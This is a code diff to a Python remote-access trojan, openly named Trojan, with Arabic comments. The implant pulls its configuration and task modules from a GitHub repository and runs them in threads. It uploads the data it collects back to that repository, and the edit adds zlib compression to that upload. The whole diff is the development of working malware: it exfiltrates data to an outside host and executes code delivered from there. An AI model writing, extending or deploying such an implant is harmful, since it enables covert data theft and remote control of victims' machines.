@@ -6,7 +6,8 @@ import random
 import sys
 import threading
 import time
-import uuid  # مكتبة لإنشاء أسماء فريدة
+import uuid
+import zlib  # مكتبة الضغط ضرورية
 from datetime import datetime
 
 # إعداد الاتصال
@@ -26,7 +27,6 @@ class Trojan:
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
         self.repo = github_connect()
-        # إنشاء قفل لمنع التضارب عند الرفع
         self.lock = threading.Lock()
 
     def get_config(self):
@@ -45,7 +45,6 @@ class Trojan:
             print(f"[-] Error running module {module}: {e}")
 
     def store_module_result(self, data):
-        # استخدام UUID لضمان عدم تكرار اسم الملف أبداً
         message = datetime.now().isoformat().replace(":", "-")
         unique_name = f'{message}_{uuid.uuid4()}.data'
         remote_path = f'data/{self.id}/{unique_name}'
@@ -55,10 +54,13 @@ class Trojan:
         else:
             bindata = bytes('%r' % data, 'utf-8')
             
-        # استخدام القفل لإجبار العمليات على الانتظار (يحل مشكلة 409 Conflict)
+        # ضغط البيانات لتفادي Timeout
+        compressed_data = zlib.compress(bindata)
+
         with self.lock:
             try:
-                self.repo.create_file(remote_path, message, base64.b64encode(bindata))
+                # رفع البيانات المضغوطة
+                self.repo.create_file(remote_path, message, base64.b64encode(compressed_data))
                 print(f"[+] Data saved: {unique_name}")
             except Exception as e:
                 print(f"[-] Failed to save data: {e}")
@@ -72,7 +74,6 @@ class Trojan:
                     args=(task['module'],)
                 )
                 thread.start()
-            # زيادة وقت الانتظار قليلاً لتخفيف الضغط على الشبكة
             time.sleep(random.randint(5, 20))
 
 class GitImporter:
